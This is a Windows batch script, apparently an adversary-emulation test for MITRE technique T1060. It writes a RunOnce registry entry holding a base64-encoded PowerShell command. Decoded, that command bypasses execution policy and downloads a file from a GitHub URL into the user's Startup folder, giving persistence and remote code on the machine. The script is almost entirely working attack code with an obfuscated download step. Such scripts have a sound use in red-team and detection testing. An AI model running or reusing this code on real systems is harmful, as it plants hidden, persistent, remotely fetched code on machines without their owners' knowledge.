@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Registry Run Keys and Startup Folder (T1060)
ECHO.
ECHO [+] Add Registry Entries to achieve Persistence
ECHO 	- HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
ECHO -------------------------------------------------------------------
powershell -ep bypass $RunOnceKey='HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce'; New-ItemProperty -path $RunOnceKey -Name 'NextRun' -value 'powershell -enc UABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQBwACAAYgB5AHAAYQBzAHMAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAZgBpAGwAZQAoACIAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBnAHIAZQB5AGMAZQBsAC8AcABvAGMALwBtAGEAcwB0AGUAcgAvAEEAUABUADEAOQBfAFMAeQBzAGkAbgBmAG8AIgAsACIAQwA6AFwAVQBzAGUAcgBzAFwARwByAGUAeQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUwB0AGEAcgB0ACAATQBlAG4AdQBcAFAAcgBvAGcAcgBhAG0AcwBcAFMAdABhAHIAdAB1AHAAXABBAFAAVAAxADkAXwBTAHQAYQByAHQAdQBwAC4AYgBhAHQAIgApAA==';
ECHO.

